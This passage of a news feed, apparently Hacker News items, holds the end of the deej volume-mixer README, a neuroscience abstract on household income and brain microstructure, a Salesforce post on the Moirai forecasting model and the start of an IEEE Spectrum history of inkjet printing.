<p dir="auto"><h3 tabindex="-1" dir="auto">Build procedure</h3><a id="user-content-build-procedure" aria-label="Permalink: Build procedure" href="#build-procedure"></a></p>
<ul dir="auto">
<li>Connect everything according to the <a href="#schematic">schematic</a></li>
<li>Test with a multimeter to be sure your sliders are hooked up correctly</li>
<li>Flash the Arduino chip with the sketch in <a href="https://github.com/omriharel/deej/blob/master/arduino/deej-5-sliders-vanilla/deej-5-sliders-vanilla.ino"><code>arduino\deej-5-sliders-vanilla</code></a>
<ul dir="auto">
<li><em>Important:</em> If you have more or less than 5 sliders, you must edit the sketch to match what you have</li>
</ul>
</li>
<li>After flashing, check the serial monitor. You should see a constant stream of values separated by a pipe (<code>|</code>) character, e.g. <code>0|240|1023|0|483</code>
<ul dir="auto">
<li>When you move a slider, its corresponding value should move between 0 and 1023</li>
</ul>
</li>
<li>Congratulations, you're now ready to run the deej executable!</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">How to run</h2><a id="user-content-how-to-run" aria-label="Permalink: How to run" href="#how-to-run"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Requirements</h3><a id="user-content-requirements" aria-label="Permalink: Requirements" href="#requirements"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Windows</h4><a id="user-content-windows" aria-label="Permalink: Windows" href="#windows"></a></p>
<ul dir="auto">
<li>Windows. That's it</li>
</ul>
<p dir="auto"><h4 tabindex="-1" dir="auto">Linux</h4><a id="user-content-linux" aria-label="Permalink: Linux" href="#linux"></a></p>
<ul dir="auto">
<li>Install <code>libgtk-3-dev</code>, <code>libappindicator3-dev</code> and <code>libwebkit2gtk-4.0-dev</code> for system tray support. Pre-built Linux binaries aren't currently released, so you'll need to <a href="#building-from-source">build from source</a>. If there's demand for pre-built binaries, please <a href="https://discord.gg/nf88NJu" rel="nofollow">let me know</a>!</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Download and installation</h3><a id="user-content-download-and-installation" aria-label="Permalink: Download and installation" href="#download-and-installation"></a></p>
<ul dir="auto">
<li>Head over to the <a href="https://github.com/omriharel/deej/releases">releases page</a> and download the <a href="https://github.com/omriharel/deej/releases/latest">latest version</a>'s executable and configuration file (<code>deej.exe</code> and <code>config.yaml</code>)</li>
<li>Place them in the same directory anywhere on your machine</li>
<li>(Optional, on Windows) Create a shortcut to <code>deej.exe</code> and copy it to <code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code> to have deej run on boot</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building from source</h3><a id="user-content-building-from-source" aria-label="Permalink: Building from source" href="#building-from-source"></a></p>
<p dir="auto">If you'd rather not download a compiled executable, or want to extend deej or modify it to your needs, feel free to clone the repository and build it yourself. All you need is a Go 1.14 (or above) environment on your machine. If you go this route, make sure to check out the <a href="https://github.com/omriharel/deej/blob/master/pkg/deej/scripts">developer scripts</a>.</p>
<p dir="auto">Like other Go packages, you can also use the <code>go get</code> tool: <code>go get -u github.com/omriharel/deej</code>. Please note that the package code now resides in the <code>pkg/deej</code> directory, and needs to be imported from there if used inside another project.</p>
<p dir="auto">If you need any help with this, please <a href="https://discord.gg/nf88NJu" rel="nofollow">join our Discord server</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Community</h2><a id="user-content-community" aria-label="Permalink: Community" href="#community"></a></p>
<p dir="auto"><a href="https://discord.gg/nf88NJu" rel="nofollow"><img src="https://camo.githubusercontent.com/21efeafcfe76a8b3c0a0e8e29f2dd89a56a54e6192f8cb0d6cef0730e9df3c5a/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3730323934303530323033383933373636373f6c6f676f3d646973636f7264" alt="Discord" data-canonical-src="https://img.shields.io/discord/702940502038937667?logo=discord"></a></p>
<p dir="auto">deej is a relatively new project, but a vibrant and awesome community is rapidly growing around it. Come hang out with us in the <a href="https://discord.gg/nf88NJu" rel="nofollow">deej Discord server</a>, or check out a whole bunch of cool and creative builds made by our members in the <a href="https://github.com/omriharel/deej/blob/master/community.md">community showcase</a>.</p>
<p dir="auto">The server is also a great place to ask questions, suggest features or report bugs (but of course, feel free to use GitHub if you prefer).</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Donations</h3><a id="user-content-donations" aria-label="Permalink: Donations" href="#donations"></a></p>
<p dir="auto">If you love deej and want to show your support for this project, you can do so using the link below. Please don't feel obligated to donate - building the project and telling your friends about it goes a very long way! Thank you very much.</p>
<p dir="auto"><a href="https://ko-fi.com/omriharel" rel="nofollow"><img src="https://camo.githubusercontent.com/552bca7ad4a634b3ee2168758c2e3d288e786d2185d77c2892bcdee7f8a53df8/68747470733a2f2f7777772e6b6f2d66692e636f6d2f696d672f676974687562627574746f6e5f736d2e737667" alt="ko-fi" data-canonical-src="https://www.ko-fi.com/img/githubbutton_sm.svg"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Contributing</h3><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">Please see <a href="https://github.com/omriharel/deej/blob/master/docs/CONTRIBUTING.md"><code>docs/CONTRIBUTING.md</code></a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">deej is released under the <a href="https://github.com/omriharel/deej/blob/master/LICENSE">MIT license</a>.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lifelong Disadvantage: How Socioeconomics Affect Brain Function (144 pts)]]></title>
            <link>https://www.jneurosci.org/content/early/2024/03/07/JNEUROSCI.1231-23.2024</link>
            <guid>39823282</guid>
            <pubDate>Tue, 26 Mar 2024 01:14:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jneurosci.org/content/early/2024/03/07/JNEUROSCI.1231-23.2024">https://www.jneurosci.org/content/early/2024/03/07/JNEUROSCI.1231-23.2024</a>, See on <a href="https://news.ycombinator.com/item?id=39823282">Hacker News</a></p>
<div id="readability-page-1" class="page"><div class="page" id="page">
	  <div data-node-nid="681452" id="node-681452--2666709058" data-pisa="jneuro;JNEUROSCI.1231-23.2024v1" data-pisa-master="jneuro;JNEUROSCI.1231-23.2024" data-apath="/jneuro/early/2024/03/07/JNEUROSCI.1231-23.2024.atom" data-hw-author-tooltip-instance="highwire_author_tooltip">
  
  
      <p><span><span>Research Articles, Behavioral/Cognitive</span></span></p>
  
      
  
        
    	<p><span>, <span data-delta="1">Olga Trofimova</span>, <span data-delta="2">Morgane Künzi</span>, <span data-delta="3">Cristina Ramponi</span>, <span data-delta="4">Antoine Lutti</span>, <span data-delta="5">Ferath Kherif</span>, <span data-delta="6">Adeliya Latypova</span>, <span data-delta="7">Peter Vollenweider</span>, <span data-delta="8">Pedro Marques-Vidal</span>, <span data-delta="9">Martin Preisig</span>, <span data-delta="10">Matthias Kliegel</span>, <span data-delta="11">Silvia Stringhini</span> and <span data-delta="12">Bogdan Draganski</span></span></p>
  
    	<p><span>Journal of Neuroscience </span><span>18 March 2024,  </span><span>e1231232024; </span><span>DOI: https://doi.org/10.1523/JNEUROSCI.1231-23.2024 </span></p>
  
  
    	
  
</div> <!-- /.panel-row-wrapper -->	
	  
  <div data-panels-ajax-tab-preloaded="jnl_sfneneuro_tab_art" id="panels-ajax-tab-container-highwire_article_tabs"><div xmlns="http://www.w3.org/1999/xhtml" data-highwire-cite-ref-tooltip-instance="highwire_reflinks_tooltip" xmlns:xhtml="http://www.w3.org/1999/xhtml"><div id="abstract-1"><h2>Abstract</h2><p id="p-6">Despite major advances, our understanding of the neurobiology of life course socioeconomic conditions is still scarce. This study aimed to provide insight into the pathways linking socioeconomic exposures – household income, last-known occupational position, and life course socioeconomic trajectories – with brain microstructure and cognitive performance in middle to late adulthood. We assessed socioeconomic conditions alongside quantitative relaxometry and diffusion-weighted magnetic resonance imaging indicators of brain tissue microstructure, and cognitive performance in a sample of community-dwelling men and women (N=751, aged 50-91 years). We adjusted the applied regression analyses and structural equation models for the linear and non-linear effects of age, sex, education, cardiovascular risk factors, and presence of depressive, anxiety, and substance use disorders. Individuals from lower income households showed signs of advanced brain white matter aging with greater mean diffusivity, lower neurite density, lower myelination, and lower iron content. The association between household income and mean diffusivity was mediated by neurite density (B=0.084, p=0.003) and myelination (B=0.019, p=0.009); mean diffusivity partially mediated the association between household income and cognitive performance (B=0.017, p&lt;0.05). Household income moderated the relation between white matter microstructure and cognitive performance, such that greater mean diffusivity, lower myelination, or lower neurite density was only associated with poorer cognitive performance among individuals from lower income households. Individuals from higher income households showed preserved cognitive performance even with greater mean diffusivity, lower myelination, or lower neurite density. These findings provide novel mechanistic insight into associations between socioeconomic conditions, brain anatomy, and cognitive performance in middle to late adulthood.</p><p id="p-7"><strong>Significance statement</strong> Pathways linking socioeconomic conditions, brain anatomy, and cognitive performance have rarely been investigated. Using multi-contrast imaging, we found that individuals from lower income households had markers of advanced brain white matter aging with lower neurite density, lower myelination, and lower iron content, alongside greater mean diffusivity. Greater mean diffusivity (reflecting myelin and neurite density) contributed to the association between household income and cognitive performance. Household income also buffered the observed white matter effects, such that greater mean diffusivity, lower index of myelin content, or lower neurite density was only associated with poorer cognitive performance among individuals from lower income households. These findings provide a detailed neurobiological understanding of socioeconomic differences in brain anatomy and associated cognitive performance.</p></div><div id="fn-group-1"><h2>Footnotes</h2><ul><li id="fn-2"><p id="p-2">The authors declare no competing financial interests.</p></li><li id="fn-3"><p id="p-3">This work was supported by the Leenaards Foundation Scientific Prize, awarded to S. Stringhini, M. Kliegel, and B. Draganski. The CoLaus|PsyCoLaus study was supported by research grants from GlaxoSmithKline, the Faculty of Biology and Medicine of Lausanne, the Swiss National Science Foundation (grants 3200B0_105993, 3200B0_118308, 33CSCO_122661, 33CS30_139468, 33CS30_148401, 33CS30_177535, 3247730_204523, 32003B_135679, 32003B_159780, 324730_192755, and CRSK-3_190185), the ERA-NET iSEE project, and the Swiss Personalized Health Network (project: Swiss Ageing Citizen Reference). LREN is very grateful to the ROGER DE SPOELBERCH and Partridge Foundations for their generous financial support. The authors thank those who participated in the CoLaus|PsyCoLaus study, as well as all of those who made the CoLaus|PsyCoLaus study possible.</p></li><li id="fn-4"><p id="p-4"><a href="#xref-fn-4-1">↵</a><sup>*</sup>equal contribution</p></li></ul></div></div>
<div id="mini-panel-jnl_sfneneuro_challenge"><div>
  
      
  
  <p>
    <h3>Member Log In</h3>
  </p>

  
  </div>
<div>
    <div><h3>Log in using your username and password</h3></div><div><h3>Purchase access</h3><p>You may purchase access to this article. This will require you to <a href="https://www.jneurosci.org/user/register">create an account</a> if you don't already have one.</p></div>  </div>
</div>
</div> <!-- /.panel-row-wrapper -->	
	
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Moirai: A time series foundation model for universal forecasting (172 pts)]]></title>
            <link>https://blog.salesforceairesearch.com/moirai/</link>
            <guid>39823104</guid>
            <pubDate>Tue, 26 Mar 2024 00:51:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.salesforceairesearch.com/moirai/">https://blog.salesforceairesearch.com/moirai/</a>, See on <a href="https://news.ycombinator.com/item?id=39823104">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
          <p><strong>TL;DR: </strong>Moirai is a cutting-edge time series foundation model, offering universal forecasting capabilities. It stands out as a versatile time series forecasting model capable of addressing diverse forecasting tasks across multiple domains, frequencies, and variables in a zero-shot manner.&nbsp; To achieve this, Moirai tackles four major challenges: (i) construction of a LOTSA, a large-scale and diverse time series dataset, comprising 27 billion observations spanning nine distinct domains, (ii) development of multiple patch size projection layers, allowing a single model to capture temporal patterns across various frequencies, (iii) implementation of an any-variate attention mechanism, empowering a single model to handle forecasts across any variable, and (iv) integration of a mixture distribution to model flexible predictive distributions. Through comprehensive evaluation in both in-distribution and out-of-distribution settings, Moirai demonstrates its prowess as a zero-shot forecaster, consistently delivering competitive or superior performance compared to full-shot models.</p><h3 id="the-need-for-a-universal-forecaster"><strong>The need for a universal forecaster&nbsp;</strong></h3><p>Time series data pervades numerous domains, including retail, finance, manufacturing, healthcare, and natural sciences. Across these sectors, time series forecasting is a critical application with significant implications for decision making. Although significant strides have been made in deep learning for time series forecasting, recent advancements still predominantly adhere to the conventional paradigm of training a model for a specific dataset with a fixed, pre-defined context and prediction length. Such a paradigm inevitably imposes a significant burden in terms of computational costs for training these models, especially when scaling to large numbers of users.</p><p>For example, a growing demand for cloud computing services has magnified the importance of efficiently managing resources in I.T. infrastructure. Operational forecasting has emerged as a critical component in the pipeline of managing these resources, as the main driving factor for capacity planning, budget planning, scenario risk assessment, cost optimization, and anomaly detection. However, with the ever-increasing demand for compute resources and the growing size of I.T. infrastructure, the ability of service providers to handle the forecasting needs across the multitude of tasks is continually challenged, on top of having to build task/user-specific forecasters.</p><p>This motivates us to move towards the <strong>universal forecasting </strong>paradigm (see Figure 1), where a single large pre-trained model is capable of handling any time series forecasting problem.<br></p><figure><img src="https://lh7-us.googleusercontent.com/Uce4IUNaaJeSTseY72A7zPY6Edkcgy-v06c59hJgH8v4cprGDgMrkSN2iUIDazcLebg19MzrNTPBJ11i7UFO9nvTaRsPyLiJ3Mv3UGhrmLTOt_NB-9EA09LKwNjSm7U1UFQY52PPEA6MceM4_qNdIJ0" alt="" loading="lazy" width="1600" height="927"></figure><p><em>Figure 1. A universal forecaster is a large pre-trained model capable of handling any time series forecasting problem. It is trained on a large-scale time series dataset spanning multiple domains. Compared to the existing paradigm, universal forecasting faces the three key issues of i) multiple frequencies, ii) any-variate forecasting, and iii) varying distributions.</em></p><h3 id="the-challenges-for-building-a-universal-forecaster"><strong>The challenges for building a universal forecaster</strong></h3><p>The paradigm shift towards foundation models was initially sparked by the field of Natural Language Processing (NLP) which successfully trained Large Language Models (LLMs) on diverse web-scale data, capable of tackling a wide variety of downstream tasks and are even multilingual. One major innovation that allows for LLMs to handle multiple languages is Byte Pair Encoding (BPE) – converting heterogeneous languages into a unified format. Unlike NLP, the field of time series does not have a BPE equivalent, making it non-trivial to build a time series foundation that can handle the heterogeneity of time series data.</p><ul><li>Firstly, the frequency (e.g., minutely, hourly, daily sampling rates) of time series plays a crucial role in determining the patterns present in the data. However, cross-frequency learning poses challenges due to negative interference, with existing approaches typically circumventing this issue for multi-frequency datasets by training one model per frequency.</li><li>Secondly, time series data exhibit heterogeneity in terms of dimensionality, where multivariate time series may have varying numbers of variables. Moreover, each variable often measures a semantically distinct quantity across datasets. While treating each variable of a multivariate time series independently can mitigate this issue, a universal model should ideally be flexible enough to consider interactions between variables and account for exogenous covariates.</li><li>Thirdly, probabilistic forecasting is a critical requirement for many applications. However, different datasets possess varying support and distributional properties. For instance, using a symmetric distribution (e.g., Normal, Student-T) as the predictive distribution may not be suitable for positive time series. Consequently, standard approaches that pre-define a simple parametric distribution may lack the flexibility needed to capture the diverse range of datasets effectively.</li><li>Lastly, the development of a large pre-trained model capable of universal forecasting necessitates a comprehensive dataset spanning diverse domains. Unfortunately, existing time series datasets are often insufficiently large and diverse to support the training of such models.</li></ul><h3 id="our-new-approach-unified-training-of-universal-time-series-forecasting-transformers"><strong>Our New Approach: Unified Training of Universal Time Series Forecasting Transformers</strong></h3><figure><img src="https://lh7-us.googleusercontent.com/TNMispgc6wQdAYD3U1Now7ivOwe46i3rHG-XtzTQR3iAdsNkevH_zJ2wcxIuVg8lYquPAR1Q_AP0FhkPvXZrOR3izbHPbmUu16tRifO9-cRTIF0VHxbAdK8DBSoCWhYnF-H37OcSJFCbxjODBqApsdI" alt="" loading="lazy" width="1600" height="597"></figure><p><em>Figure 2. The overall architecture of Moirai. The visualization depicts a 3-variate time series, where variates 0 and 1 represent target variables (i.e., those to be forecasted), and variate 2 serves as a dynamic covariate (with known values in the forecast horizon). Utilizing a patch size of 64, each variate is patchified into three tokens. These patch embeddings, along with sequence and variate identifiers, are fed into the Transformer. The shaded patches in the visualization denote the forecast horizon to be predicted. The corresponding output representations of these patches are then mapped into the parameters of the mixture distribution.</em></p><p>To address these challenges, we present novel enhancements (see Figure 2) to the conventional time series Transformer architecture to handle the heterogeneity of arbitrary time series data. Here are some of the key features and contributions of our work:</p><ul><li>Firstly, we propose to address the challenge of varying frequencies in time series data by learning multiple input and output projection layers. These layers are designed to handle the diverse patterns present in time series of different frequencies. By employing patch-based projections with larger patch sizes for high-frequency data and vice versa, the projection layers are specialized to learn the patterns specific to each frequency.</li><li>Secondly, we tackle the issue of varying dimensionality using our proposed Any-variate Attention mechanism. This approach simultaneously considers both the time and variate axes as a single sequence, leveraging Rotary Position Embeddings (RoPE) and learned binary attention biases to encode the time and variate axes, respectively. Importantly, Any-variate Attention enables the model to accept an arbitrary number of variates as input.</li><li>Thirdly, we overcome the challenge of requiring flexible predictive distributions by introducing a mixture of parametric distributions. By optimizing the negative log-likelihood of a flexible distribution, we ensure that our model is competitive with target metric optimization, a powerful feature for pre-training universal forecasters. This approach allows for subsequent evaluation using any target metric.</li><li>Lastly, to facilitate the training of our large time series model, we introduce the LOTSA, the largest collection of open time series datasets by collating publicly available sources of time series datasets. This effort aims to cover a broad spectrum of domains, consolidating datasets from diverse sources with varying formats. The resulting collection spans nine domains, with a total of 27B observations, with key statistics in Tables 2 and 3. More details on the key properties of these datasets, like the domain, frequency, number of time series, number of target variates, number</li></ul><p>of past covariates, and the total number of observations can be found in our research paper (<a href="https://arxiv.org/abs/2402.02592?ref=blog.salesforceairesearch.com"><u>https://arxiv.org/abs/2402.02592</u></a>).<br></p><figure><img src="https://lh7-us.googleusercontent.com/61ZRODYLOxjflX-7nitzYcWcNtdZZ2ZYllIIm_FoyXg6uP63ThL7Y3CL6BrwywrGNLhMo0QPv-VfVEmwkfW5xwsDjzsq7Mib0PSfJk7ts4TGfmeYrMe-4D_4pH5pr7YTZJ3LVVf2qXgRt0Y9BjOSjQ8" alt="" loading="lazy" width="1600" height="462"></figure><h3 id="deeper-dive-moirai"><strong>Deeper Dive: Moirai</strong></h3><p>Illustrated in Figure 2, Moirai follows a (non-overlapping) patch-based approach to modeling time series with a masked encoder architecture. One of our proposed modifications to extend the architecture to the any-variate setting is to "flatten" multivariate time series, considering all variates as a single sequence. Patches are subsequently projected into vector representations via a multi-patch size input projection layer. The [mask] signifies a learnable embedding that replaces patches falling within the forecast horizon. The output tokens are then decoded via the multi-patch size output projection into the parameters of the mixture distribution. While not visualized, (non-learnable) instance normalization is applied to inputs/outputs, aligning with the current standard practice for deep forecasting models.&nbsp;</p><p>In our pre-training task, we formulate the objective to optimize the mixture distribution log-likelihood. The design of both the data distribution and task distribution are two critical aspects of the pre-training pipeline. This design imparts versatile capabilities to our Large Time Series Model (LTM), enabling it to adapt to a range of downstream tasks. This flexibility stands in contrast to the prevailing deep forecasting paradigm, where models are typically specialized for specific datasets and settings.</p><h3 id="results"><strong>Results</strong></h3><p>We train Moirai in 3 sizes – small/base/large with 14m/91m/311m parameters! On in-distribution evaluations using the Monash Time Series Forecasting Benchmark, Moirai displays phenomenal performance, beating all baselines.&nbsp;</p><figure><img src="https://lh7-us.googleusercontent.com/hhBUPDh3d2PobIIj4fndgzk_buqAwD48Uu3dlv7i3Xms2S7gjx56tkcXUAo-1WGWn6gx4waygnH2tg6NKAVaygWRJOV7R-lpvO0VKrC5FeH09cWCq-L8cxzfZprrzuSeUbtIH49yVh6kXhXbnmBHYTQ" alt="" loading="lazy" width="878" height="494"></figure><p>In out-of-distribution/zero-shot forecasting evaluations, Moirai consistently demonstrates competitive performance, and in some instances, surpasses state-of-the-art full-shot models. This superiority is observed across probabilistic forecasting and long-sequence forecasting benchmarks.</p><figure><img src="https://lh7-us.googleusercontent.com/7eEE0QBlp8uxq5gMoYW7m3l-2-dIotL5_YvH7s-_m6KjU4cOa5x82bSr_aX8UjbHmjJ6GLfNVa3sj1cwu9Y0JEthXedFZXdUUXij7mOZQhaVF7OuE_en9t6HtjXlnaE1WhKeeVRJRO9T-SrhLray7k0" alt="" loading="lazy" width="1600" height="513"></figure><figure><img src="https://lh7-us.googleusercontent.com/J4TVppnqY5bCrN15eV7XdMaCc7tMDDH6Dj9u-sd_IiEyQIjyZRksFn1gzemjOxpQg03BN6nwcOtCKxJ3EeL8flA4lfvAWBbbkKLsxf-tpEhFEPkB9O8x1DBHkxBUvVNw2rzArvxiVtKOqo7SGAORQxY" alt="" loading="lazy" width="1600" height="495"></figure><p>Here are some visualizations of zero-shot forecasts from Moirai on the popular datasets. As depicted, Moirai adeptly crafts forecasts marked by discernible seasonal patterns from ETTh1-1 and ETTh1-2, while also accurately capturing trend patterns from ETTm1-1 and ETTm1-2. These illustrations underscore Moirai's capability to deliver insightful predictions across varied scenarios.</p><figure><img src="https://lh7-us.googleusercontent.com/PQR1m2ZjXBnu2N_PI6lKduLFCCvMV_QrXrmVqdITlRgyo2eXSS70qbmFS-8pr4MXSQBgXNo_KCiq5qkUt32mjWUkntjb98RKevDo-2tp_wlwPudmIv39HZMdMq6vw34v149n8DImSNytM28cxmkQoec" alt="" loading="lazy" width="1002" height="1028"></figure><h3 id="impact-why-moirai-matters"><strong>Impact: Why Moirai Matters</strong></h3><p>Moirai provides robust zero-shot forecasting capabilities across a diverse range of time series spanning different domains and frequencies. By harnessing the power of large-scale data pretraining, this time-series foundation model revolutionizes the landscape, departing from the outdated one-model-per-dataset approach. It offers substantial advantages to users in downstream forecasting tasks, eliminating the need for additional data, extensive computational resources, and expert input typically required for achieving accurate forecasts with deep learning models. Additionally, Moirai's ability to handle multivariate time series of any dimension further democratizes accurate forecasting by reducing reliance on both computational resources and deep learning expertise. In addition to being an important breakthrough for academia, Moirai has multiple applications including IT Operations, Sales Forecasting, Capacity Planning, Energy Forecasting and many others. </p><h3 id="the-bottom-line"><strong>The Bottom Line</strong></h3><ul><li>Moirai is designed to achieve universal forecasting with masked encoder-based time series transformers.</li><li>LOTSA is the largest collection of open data for pre-training time series forecasting models.</li><li>Moirai addresses key challenges of universal forecasting to support various domains, multiple frequencies, and any-variate in a zero-shot manner.</li><li>Evaluated in both in-distribution and out-of-distribution settings, Moirai shines as a zero-shot forecaster, delivering competitive or even superior performance compared to full-shot models.</li></ul><h3 id="explore-more"><strong>Explore More</strong></h3><p>Salesforce AI invites you to dive deeper into the concepts discussed in this blog post (see links below). Connect with us on social media and our website to get regular updates on this and other research projects.</p><ul><li><em>Learn more: </em>Check out our research paper (<a href="https://arxiv.org/abs/2402.02592?ref=blog.salesforceairesearch.com"><u>https://arxiv.org/abs/2402.02592</u></a>), which describes our work in greater detail.</li><li><em>Code: </em>Check out our code on GitHub:<a href="https://github.com/salesforce/PyRCA?ref=blog.salesforceairesearch.com"><em><u> </u></em></a><a href="https://github.com/SalesforceAIResearch/uni2ts?ref=blog.salesforceairesearch.com"><u>https://github.com/SalesforceAIResearch/uni2ts</u></a></li><li><em>Dataset</em>: Check out LOTSA data on Hugging Face: <a href="https://huggingface.co/datasets/Salesforce/lotsa_data?ref=blog.salesforceairesearch.com"><u>https://huggingface.co/datasets/Salesforce/lotsa_data</u></a>&nbsp;</li><li><em>Contact us: </em><a href="mailto:gwoo@salesforce.com"><em><u>&nbsp;gwoo@salesforce.com</u></em></a> <a href="mailto:chenghao.liu@salesforce.com"><u>chenghao.liu@salesforce.com</u></a></li><li><em>Follow us on Twitter: </em><a href="https://twitter.com/sfresearch?ref=blog.salesforceairesearch.com"><u>@SalesforceResearch</u></a>, <a href="https://twitter.com/salesforce?ref=blog.salesforceairesearch.com"><u>@Salesforce</u></a></li><li><em>Blog: </em>To read other blog posts, please see <a href="https://blog.salesforceairesearch.com/"><u>blog.salesforceairesearch.com</u></a></li><li><em>Main site: </em>To learn more about all of the exciting projects at Salesforce AI Research, please visit our main website at <a href="https://www.salesforceairesearch.com/?ref=blog.salesforceairesearch.com"><u>salesforceairesearch.com</u></a>.</li></ul><h3 id="about-the-authors"><strong>About the Authors</strong></h3><p><strong>Gerald Woo </strong>is a Ph.D. candidate in the Industrial PhD Program at Singapore Management University and a researcher at Salesforce AI Research Asia and his research focuses on deep learning for time-series, including representation learning, and forecasting.</p><p><strong>Chenghao Liu</strong> is a Lead Applied Scientist at Salesforce AI Research Asia, working on AIOps research, including time series forecasting, anomaly detection, and causal machine learning.</p><p><strong>Doyen Sahoo </strong>is the Director, of Salesforce AI Research Asia. Doyen leads several projects pertaining to AI for IT Operations or AIOps, AI for Software, and Time-Series intelligence -&nbsp; working on both fundamental and applied research.</p><p><strong>Caiming Xiong </strong>holds the positions of Managing Director and Vice President at Salesforce AI Research. He oversees the development and application of technologies such as Large Language Models (LLM), Multimodal LLMs, Large Action Models, AI for software, Time Series, and other foundational research areas. Additionally, Caiming directs the transition of these AI projects from research phases into production environments.</p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Inkjets are for more than just printing (148 pts)]]></title>
            <link>https://spectrum.ieee.org/inkjet-printer</link>
            <guid>39822222</guid>
            <pubDate>Mon, 25 Mar 2024 23:00:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/inkjet-printer">https://spectrum.ieee.org/inkjet-printer</a>, See on <a href="https://news.ycombinator.com/item?id=39822222">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-headline="Inkjets Are for More Than Just Printing" data-elid="2667578405" data-post-url="https://spectrum.ieee.org/inkjet-printer" data-authors="Phillip W. Barth, Leslie A. Field" data-page-title="A Brief History of Inkjet Printers - IEEE Spectrum"><p><strong>In the early 1980s,</strong> offices were noisy places, filled with the sound of metal striking inked ribbons to mark characters on paper. IBM Selectric typewriters clacked, daisy wheel printers clattered, and dot-matrix printers made loud ripping sounds.
</p><p>
	Today, those noises are gone. And though we do spend more time reading on screens, we haven’t stopped printing on paper.
</p><p>
	The main reason for the quiet? The inkjet printer. While laser printers do the big printing jobs in commercial settings, the inkjet printer has become 
	<em>the</em> printer most of us use at home and at the office.
</p><p>
	The printhead of an inkjet printer performs a remarkable task. Even at the coarse resolution of 96 dots per inch (dpi), as was typical for the first models in the 1980s, the distance from dot center to dot center is a mere 260 micrometers. To fill a standard letter page that has 2.5-centimeter margins would require more than half a million individual ink droplets. Delivery of those tiny droplets involves moving them with very precise control, repeated a vast number of times as rapidly as possible. This process is ideally suited for <a href="https://en.wikipedia.org/wiki/MEMS" target="_blank">microelectromechanical systems (MEMS)</a>, which are electronic devices with microscopic components that employ movement.
</p><p>If there is a way to package something in microscopic droplets with the appropriate fluid properties, chances are someone is looking to adapt inkjet technology to work with it.</p><p>
	As with all microtechnology, the specs of inkjet systems have evolved considerably over time. A typical inkjet printhead in the mid-1980s had 12 nozzles working in parallel, each one emitting up to 1,350 droplets per second, to print 150 alphanumeric characters per second. Today, a high-end inkjet printhead used in a commercial printing press may contain 21,000 nozzles, each nozzle printing 20,000 to 150,000 dots per second. Each drop of ink may be just 1.5 picoliters—a picoliter is one-trillionth of a liter—and measure roughly 14 micrometers in diameter.
</p><p>
	Surpassing the visions of its creators, the inkjet technology used in these printers has found a host of applications beyond putting dots on paper. These include making DNA microarrays for genomics, creating electrical traces for printed circuit boards, and building 3D-printed structures. Future uses could include personalized medicine and development of advanced batteries.
</p><p>
	Indeed, a search for patents containing the word “inkjet” today returns more than 92,000 results. If there is a way to package something in microscopic droplets with the appropriate fluid properties, chances are someone is looking to adapt inkjet technology to work with it.
</p><h2>How MEMS Transformed Inkjet Printing</h2><p><a href="https://library.imaging.org/admin/apis/public/api/ist/website/downloadArticle/jist/42/1/art00007" target="_blank">Inkjet technology</a> dates back to 1948, when Swedish inventor 
	<a href="https://en.wikipedia.org/wiki/Rune_Elmqvist" rel="noopener noreferrer" target="_blank">Rune Elmqvist</a>&nbsp;<a href="https://patents.google.com/patent/US2566443A/en" rel="noopener noreferrer" target="_blank">patented</a> a chart recorder wherein a very thin glass tube emitting a continuous jet of ink was steered to make a trace on a moving strip of paper. A couple of years later, <a href="https://ecglibrary.com/ecghist.html" rel="noopener noreferrer" target="_blank">he demonstrated</a> his invention in the form of <a href="https://carl-kulturen-com.translate.goog/medi/web/object/45610?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en-US&amp;_x_tr_pto=wapp" target="_blank">a device</a> for recording electrocardiograms.
</p><p>
	In 1965, Richard G. Sweet of Stanford University 
	<a href="https://doi.org/10.1063/1.1719502" rel="noopener noreferrer" target="_blank">developed a chart recorder</a> in which the jet of ink was broken into a uniform stream of electrically charged droplets. Diverter electrodes on either side of the stream could permit the drops to proceed straight to the paper, or else deflect them onto an absorbent pad or into a gutter to be collected and reused.
</p><p data-rm-resized-container="25%"><img id="9814e" data-rm-shortcode-id="763d906565f62f9acecbb6e4e63025c4" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/image.jpg?id=51827695&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/image.jpg?id=51827695&amp;width=980" width="1500" height="1000" alt=""></p><p data-rm-resized-container="25%"><img id="2e147" data-rm-shortcode-id="25911d80203ffb9022a126731f939fb6" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photos-of-hp-thinkjet-printer-ink-cartridge-and-hp-jet-fusion-5200-3d-printer.jpg?id=51827691&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photos-of-hp-thinkjet-printer-ink-cartridge-and-hp-jet-fusion-5200-3d-printer.jpg?id=51827691&amp;width=980" width="1500" height="1000" alt="Photos of HP Thinkjet printer, ink cartridge, and HP Jet Fusion 5200 3D printer."><small placeholder="Add Photo Caption...">In April 1984, the HP ThinkJet [top] ushered in the era of desktop inkjet printing. The Thinkjet’s ink cartridge [bottom] delivered thousands of microscopic droplets a second from 12 nozzles. The MEMS technology to perform that feat was 